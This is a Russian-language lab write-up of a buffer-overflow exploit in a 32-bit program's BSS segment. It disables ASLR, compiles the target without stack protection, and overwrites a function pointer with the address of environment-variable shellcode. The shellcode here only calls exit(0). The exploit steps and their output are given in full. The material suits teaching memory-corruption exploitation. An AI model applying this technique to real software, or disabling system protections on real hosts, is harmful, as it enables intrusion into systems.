
Компилируем уязвимую программу (32-bit, без защиты стека, с исполняемым BSS):

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
```bash
gcc -g -m32 -fno-stack-protector -z execstack vuln_bss.c -o vuln_bss
```

Запускаем, чтобы увидеть адреса buf, &f и переменной окружения SHELLCODE:

```bash
setarch $(uname -m) -R bash -c '
SC=$(python3 -c "import sys; sys.stdout.buffer.write(b\"\x31\xc0\xb0\x01\x31\xdb\xcd\x80\")")
SHELLCODE="$SC" ./vuln_bss a
'
```

```
addr buf: 0x56559040
addr &f:  0x565590a4
�� 0xffffc5e4
f: 0x565561cd
v: a
```

`0x565590a4 - 0x56559040 = 0x64 = 100` байт -- расстояние от `buf` до указателя `f` в .bss

`0xffffc5df` -- адрес шеллкода в переменной окружения SHELLCODE

Здесь нужно просто сделать системный вызов `exit(0)`:

```
31 c0   xor eax, eax
b0 01   mov al, 1      ; syscall exit
31 db   xor ebx, ebx  ; exit code 0
cd 80   int 0x80
```

Пейлоад: 100 байт заполнения + адрес SHELLCODE в формате little-endian.

Что получилось:

```bash
setarch $(uname -m) -R bash -c '
SC=$(python3 -c "import sys; sys.stdout.buffer.write(b\"\x31\xc0\xb0\x01\x31\xdb\xcd\x80\")")
SHELLCODE="$SC" ./vuln_bss "$(python3 payload.py)"
echo "after call - does not print in exploit"
'
```

```
addr buf: 0x56559040
addr &f: 0x565590a4
1��1�̀ 0xffffc5df
f: 0xffffc5df
after call - does not print in exploit
```

Строки `v: ...` и `here` не выводятся -- программа завершилась досрочно через вызов `exit(0)` в шеллкоде вместо `prt`.
